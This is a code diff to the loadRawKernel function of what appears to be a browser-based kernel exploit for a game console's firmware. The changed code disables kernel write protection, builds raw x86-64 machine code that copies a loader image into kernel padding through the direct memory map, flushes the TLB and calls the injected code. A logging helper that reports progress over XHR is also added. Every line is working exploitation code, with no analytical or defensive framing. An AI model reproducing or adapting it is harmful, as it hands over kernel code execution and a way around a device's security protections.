@@ -1091,26 +1091,31 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
   const fire  = function () { const r = c.callAddr(plus(buf, GH.tor), [11, plus(buf, GH.tram)]); return r.lo >>> 0; };
   const markClear = function () { wr4(plus(buf, GH.mark), 0xDEADBEEF); wr4(plus(buf, GH.mark + 4), 0xDEADBEEF); };
   const markRead = function () { return [rd4(plus(buf, GH.mark)), rd4(plus(buf, GH.mark + 4))]; };
+  const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
-  say("[p] kernel base " + text(kbase) + ", padding " + text(t));
+  saySync("[p] kernel base " + text(kbase) + ", padding " + text(t));
   if (K.anchor !== 0xe6c30) {
-    say("[p] ---> calling runPatchSet");
+    saySync("[p] ---> calling runPatchSet");
     if (!(await runPatchSet(room))) return false;
-    say("[p] patchset ok");
+    saySync("[p] patchset ok");
   } else {
-    say("[p] patchset.bin skipped for FW 14.02 (hardcoded FW 14.00 offsets)");
+    saySync("[p] patchset.bin skipped for FW 14.02 (hardcoded FW 14.00 offsets)");
   }
-  say("[p] ---> calling paddingRW");
-  if (!paddingRW(k, kbase)) { say("[p] stopping: padding would stay read only"); return false; }
+  saySync("[p] ---> calling paddingRW");
+  const dmapPad = paddingRW(k, kbase);
+  if (!dmapPad) { saySync("[p] stopping: padding would stay read only"); return false; }
+  saySync("[p] paddingRW ok, dmap " + text(dmapPad));
 
-  /* whole loader image (loader + zlib + trailer) into the padding, PIC */
+  /* whole loader image (loader + zlib + trailer) into the padding via DMAP, PIC */
   tram.n = 0;
   wpOff();
   hex("48be"); q64(buf);
-  hex("48bf"); q64(t);
+  hex("48bf"); q64(dmapPad);  // write through DMAP (guaranteed writable, same physical page as t)
   hex("b9"); i32(blob.length);
   hex("fc"); hex("f3a4");
   wpOn();
+  hex("48b8"); q64(t);        // invlpg [t] -- flush stale TLB entry after paddingRW+movsb
+  hex("0f0138");
   hex("b8"); i32(0x5758); hex("c3");
   const cp = fire();
   if (cp !== 0x5758) { say("[p] copy into padding returned 0x" + cp.toString(16)); return false; }
